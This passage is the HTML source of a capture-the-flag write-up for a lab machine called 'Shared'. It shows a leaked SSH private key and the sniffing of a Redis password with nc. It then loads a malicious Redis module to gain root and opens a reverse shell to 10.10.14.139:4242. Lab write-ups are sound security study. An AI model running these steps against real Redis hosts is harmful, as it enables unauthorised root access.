+Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/H
+I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKU
+SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbE
+SENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE
+wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW
+HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs
+<span class="nv">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg</span><span class="o">==</span>
+-----END<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+</pre></div>
+</div>
+<p>Now as dan we have access to the sysadmin group</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dan_smith<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>dan_smith<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>dan_smith<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>,1003<span class="o">(</span>sysadmin<span class="o">)</span>
+</pre></div>
+</div>
+<p>And the only thing it gives access to is this</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>find<span class="w"> </span>/<span class="w"> </span>-group<span class="w"> </span>sysadmin<span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
+/usr/local/bin/redis_connector_dev
+</pre></div>
+</div>
+<p>That’s a C binary, probaly what the other cronjob we observed earlier is triggering through <code class="docutils literal notranslate"><span class="pre">/root/c.sh</span></code></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">file</span> <span class="n">redis_connector_dev</span>
+<span class="n">redis_connector_dev</span><span class="p">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="n">Go</span> <span class="n">BuildID</span><span class="o">=</span><span class="n">sdGIDsCGb51jonJ_67fq</span><span class="o">/</span><span class="n">_JkvEmzwH9g6f0vQYeDG</span><span class="o">/</span><span class="n">iH1iXHhyzaDZJ056wX9s</span><span class="o">/</span><span class="mi">7</span><span class="n">UVi3T2i2LVCU8nXlHgr</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
+</pre></div>
+</div>
+<p>Lets exfiltrate it, and move it to an amd64 machine. Now we could  do some fancy binary reversing, but the filename literally says <code class="docutils literal notranslate"><span class="pre">redis_connector</span></code>, so it’s a pretty safe assumption to make, that it will attempt to connect to redis. Lets try just kicking off the binary while listening on the redis port.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">6379</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">6379</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span><span class="w"> </span><span class="m">59976</span>
+*2
+<span class="nv">$4</span>
+auth
+<span class="nv">$16</span>
+<span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
+</pre></div>
+</div>
+<p>And sure enough that’s the password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>redis-cli
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>info
+NOAUTH<span class="w"> </span>Authentication<span class="w"> </span>required.
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>auth<span class="w"> </span><span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
+OK
+</pre></div>
+</div>
+<p>There’s apparently no key value pairs in this redis instance, but we might still be able to use it as a Privilege escalation vector</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>KEYS<span class="w"> </span>*
+<span class="o">(</span>empty<span class="w"> </span>array<span class="o">)</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a><br />
+<a class="reference external" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<p>Using the above we’re building a redis module writen in C from an amd64 machine. And then loading it from the running redis instance. That module then lets us call system commands, or run a reverse shell.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>module<span class="w"> </span>load<span class="w"> </span>/dev/shm/module.so
+OK
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>INFO<span class="w"> </span>modules
+<span class="c1"># Modules</span>
+module:name<span class="o">=</span>system,ver<span class="o">=</span><span class="m">1</span>,api<span class="o">=</span><span class="m">1</span>,filters<span class="o">=</span><span class="m">0</span>,usedby<span class="o">=[]</span>,using<span class="o">=[]</span>,options<span class="o">=[]</span>
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>auth<span class="w"> </span><span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
+OK
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>module<span class="w"> </span>load<span class="w"> </span>/dev/shm/module.so
+OK
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>system.exec<span class="w"> </span><span class="s2">&quot;id&quot;</span>
+<span class="s2">&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;</span>
+<span class="m">127</span>.0.0.1:6379&gt;<span class="w"> </span>system.rev<span class="w"> </span><span class="m">10</span>.10.14.139<span class="w"> </span><span class="m">4242</span>
+</pre></div>
+</div>
+<p>Catching the shell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4242</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4242</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.139<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.11.172<span class="o">]</span><span class="w"> </span><span class="m">33752</span>
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+<span class="nb">pwd</span>
+/var/lib/redis
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+</pre></div>
+</div>
+<p>Notes on how to steer things around in redis-cli</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>redis-cli<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-p<span class="w"> </span><span class="m">6379</span>
+redis-cli
+INFO<span class="w">                 </span><span class="c1"># if NOAUTH Authentication required, then auth is needed</span>
+AUTH<span class="w"> </span>password<span class="w">        </span><span class="c1"># redis can be configured to have only a password</span>
+AUTH<span class="w"> </span>user<span class="w"> </span>password<span class="w">   </span><span class="c1"># or both a username and a password</span>
+INFO<span class="w"> </span>keyspace<span class="w">        </span><span class="c1"># equivalent to a show databases</span>
+SELECT<span class="w"> </span><span class="m">1</span><span class="w">             </span><span class="c1"># select database 1</span>
+KEYS<span class="w"> </span>*<span class="w">               </span><span class="c1"># List all keys in database 1</span>
+
+get<span class="w"> </span>key:1
+<span class="nb">set</span><span class="w"> </span>key:1<span class="w"> </span>newvalue
+del<span class="w"> </span>key:1
+
+MODULE<span class="w"> </span>LOAD<span class="w"> </span>/path/to/mymodule.so<span class="w">  </span><span class="c1"># load a module at runtime</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../updown/updown.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Updown</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../scrambled/scrambled.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Scrambled</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Shared</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#blockwishlist-sqli">Blockwishlist sqli:</a></li>
+<li><a class="reference internal" href="#hash-cracking">Hash Cracking</a></li>
+<li><a class="reference internal" href="#privesc-from-james-to-dan">Privesc from james to dan</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
